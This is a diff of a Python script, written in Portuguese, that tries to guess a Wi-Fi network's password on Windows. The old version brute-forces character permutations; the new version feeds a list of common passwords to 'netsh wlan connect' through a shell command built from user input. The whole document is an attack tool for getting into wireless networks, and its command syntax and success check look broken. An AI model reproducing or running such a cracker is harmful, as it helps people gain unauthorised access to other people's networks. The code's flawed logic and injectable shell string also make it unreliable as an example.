@@ -1,27 +1,36 @@
-from subprocess import Popen,STDOUT,PIPE,call
+from subprocess import Popen, PIPE, call
 from time import sleep
-from itertools import permutations
-import string 
+import string
 
-#for windows OS
+def testar(nome, senha):
+    try:
+        comando = f'netsh wlan connect name="{nome}" key="{senha}"'
+        manipulador = Popen(comando, shell=True, stdout=PIPE, stderr=PIPE)
 
-print('digite o nome da rede wifi :')
-nome = input()
+        stdout, stderr = manipulador.communicate()
 
-def testar(senha) :
-    manipulador = Popen('netsh wlan connect {}'.format(nome),shell=False,stdout=PIPE,stderr=STDOUT,stdin=PIPE)
-    manipulador.stdin.write(senha) 
-    while manipulador.poll() == None:
-        print(manipulador.stdout.readline().strip())
-    if  call('ping -n 1 www.google.com') == 0 :
-        print('conectado')
-        print("está é a senha : {}".format(senha))
-        exit()
-    else:
-        print("{} não é a senha".format(senha))
+        if "conectado" in stdout.decode('utf-8').lower():
+            print('Conectado')
+            print(f"Esta é a senha: {senha}")
+            exit()
+        else:
+            print(f"{senha} não é a senha")
+            return False
+    except Exception as e:
+        print(f"Ocorreu um erro ao tentar a senha {senha}: {e}")
+        return False
 
-caracteres = string.printable
-for x in range(8,len(caracteres)+1) :
-    for y in permutations(caracteres,x) :
-        testar(str(y).encode('utf-8'))
- 
+print('Digite o nome da rede Wi-Fi:')
+nome = input().strip()
+
+senhas_comuns = [
+    '12345678', 'password', '123456789', '1234567', '123456',
+    '12345', '1234567890', 'qwerty', 'abcdef', 'abc123'
+]
+
+
+pausa = 1
+
+for senha in senhas_comuns:
+    testar(nome, senha)
+    sleep(pausa)
